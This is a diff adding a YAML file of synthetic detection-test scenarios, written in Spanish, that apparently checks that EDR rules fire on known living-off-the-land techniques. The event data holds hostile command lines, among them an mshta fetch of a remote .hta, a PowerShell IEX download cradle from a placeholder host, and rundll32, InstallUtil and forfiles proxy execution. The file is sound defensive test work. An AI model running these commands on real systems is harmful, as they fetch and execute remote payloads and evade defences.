@@ -1,0 +1,158 @@
+# Escenarios de validacion de deteccion (SIM-1/SIM-2).
+# Telemetria sintetica e inerte: el mismo esquema de eventos que
+# envia el sensor, sin ejecutar nada en ningun equipo. Cada escenario
+# declara las alertas que el motor DEBE disparar (shipped rule/sequence
+# id); el test de CI falla si una deja de detectarse.
+
+- name: Ejecucion de scripts con mshta (sintetico)
+  id: sim-mshta-http
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: ejecucion de
+    scripts con mshta desde HTTP. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1218.005
+  host: LAB-SIM-MSHTA-HTTP
+  user: CORP\sim
+  expected:
+  - rule: b2c3d4e5-0001-4b01-9e01-010101010101
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4184
+      name: mshta.exe
+      command_line: mshta.exe http://203.0.113.10/evil.hta
+- name: Ejecucion de JavaScript con rundll32 (sintetico)
+  id: sim-rundll32-javascript
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: ejecucion de
+    JavaScript con rundll32. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1218.011
+  host: LAB-SIM-RUNDLL32-JAVASCRIP
+  user: CORP\sim
+  expected:
+  - rule: b2c3d4e5-0002-4b02-9e02-020202020202
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4185
+      name: rundll32.exe
+      command_line: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
+- name: Ejecucion evasiva con InstallUtil (sintetico)
+  id: sim-installutil-evasion
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: ejecucion evasiva
+    con InstallUtil. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1218.001
+  host: LAB-SIM-INSTALLUTIL-EVASIO
+  user: CORP\sim
+  expected:
+  - rule: b2c3d4e5-0003-4b03-9e03-030303030303
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4186
+      name: installutil.exe
+      command_line: installutil.exe /logfile= /LogToConsole=false C:\Users\Public\svc.exe
+- name: Ejecucion indirecta con forfiles (sintetico)
+  id: sim-forfiles-indirect
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: ejecucion indirecta
+    con forfiles. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1202
+  host: LAB-SIM-FORFILES-INDIRECT
+  user: CORP\sim
+  expected:
+  - rule: b2c3d4e5-0004-4b04-9e04-040404040404
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4187
+      name: forfiles.exe
+      command_line: forfiles.exe /p C:\Windows\System32 /m cmd.exe /c "cmd /c whoami"
+- name: Editor de Office lanzando un interprete (sintetico)
+  id: sim-office-spawns-interpreter
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: cmd.exe lanzado
+    por winword.exe. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1566.001
+  host: LAB-SIM-OFFICE-SPAWNS-INTE
+  user: CORP\sim
+  expected:
+  - rule: b2c3d4e5-0005-4b05-9e05-050505050505
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 800
+      name: winword.exe
+      command_line: winword.exe /q /n informe.docm
+      image: C:\Apps\winword.exe
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4188
+      name: cmd.exe
+      ppid: 800
+      command_line: cmd.exe /c C:\Users\Public\payload.exe
+- name: Interprete de script ejecutando desde staging de usuario (sintetico)
+  id: sim-wscript-staging
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: wscript ejecutando
+    desde staging de usuario. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1204.002
+  host: LAB-SIM-WSCRIPT-STAGING
+  user: CORP\sim
+  expected:
+  - rule: b2c3d4e5-0006-4b06-9e06-060606060606
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4189
+      name: wscript.exe
+      command_line: wscript.exe C:\Users\sim\AppData\Roaming\upd.vbs
+- name: Cradle de descarga en PowerShell (sintetico)
+  id: sim-ps-cradle
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: cradle de descarga
+    en PowerShell. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1059.001
+  host: LAB-SIM-PS-CRADLE
+  user: CORP\sim
+  expected:
+  - rule: b2c3d4e5-0007-4b07-9e07-070707070707
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4190
+      name: powershell.exe
+      command_line: powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')"
+- name: Navegador lanzando un interprete de comandos (sintetico)
+  id: sim-browser-spawns-interpreter
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: cmd.exe lanzado
+    por chrome.exe. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1203
+  host: LAB-SIM-BROWSER-SPAWNS-INT
+  user: CORP\sim
+  expected:
+  - rule: b2c3d4e5-0008-4b08-9e08-080808080808
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 800
+      name: chrome.exe
+      command_line: chrome.exe --normal-browsing
+      image: C:\Apps\chrome.exe
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4191
+      name: cmd.exe
+      ppid: 800
+      command_line: cmd.exe /c powershell.exe -nop
